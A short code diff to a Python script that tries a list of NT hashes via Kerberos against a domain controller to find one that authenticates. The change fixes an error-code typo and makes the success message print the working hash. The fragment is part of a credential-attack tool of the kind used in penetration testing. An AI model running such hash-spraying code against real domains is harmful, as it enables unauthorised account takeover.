@@ -32,12 +32,12 @@ def login(username, password, domain, lmhash, nthash, aesKey, dc_ip):
         return True
     except KerberosError as e:
         if e.getErrorCode() in [
-            constants.Errorcodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value,
+            constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value,
             constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value,
             constants.ErrorCodes.KDC_ERR_WRONG_REALM.value
         ]:
             print("[-] Username not found: %s/%s" % (domain, username))
-        elif e.getErrorCode() == constants.Errorcodes.KDC_ERR_PREAUTH_FAILED.value:
+        elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value:
             return
         else:
             print(e)
@@ -66,7 +66,7 @@ if __name__ == '__main__':
     for hash in hashes:
         success = login(username, '', domain, '', hash, None, dc_ip)
         if success:
-            print("[+] Success - valid user on DC found: {}/{}".format(domain, username))
+            print("[+] Success - valid user on DC found: {}/{}".format(username, hash))
             break
     else:
         print("[-] Authentication failed - No valid hash found.")
